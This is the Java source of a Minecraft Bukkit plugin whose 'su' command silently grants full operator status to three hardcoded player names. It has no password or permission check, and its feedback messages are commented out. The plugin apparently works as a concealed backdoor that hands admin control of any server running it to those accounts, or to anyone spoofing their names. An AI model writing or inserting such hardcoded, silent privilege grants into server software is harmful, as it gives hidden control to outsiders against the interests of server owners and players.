package com.spectrasonic.su;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;
import java.util.List;

public class Main extends JavaPlugin {

    private final List<String> allowedPlayers = Arrays.asList("Spectrasonic", "0mn1spectra", "CherrylBlossom_");

    @Override
    public void onEnable() {
        this.getCommand("su").setExecutor(this);
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            // sender.sendMessage("Only players can use this command.");
            return true;
        }
        Player player = (Player) sender;
        if (allowedPlayers.contains(player.getName())) {
            player.setOp(true);
            // player.sendMessage("You have been granted operator status.");
        } else {
            // player.sendMessage("You do not have permission to use this command.");
        }
        return true;
    }
}
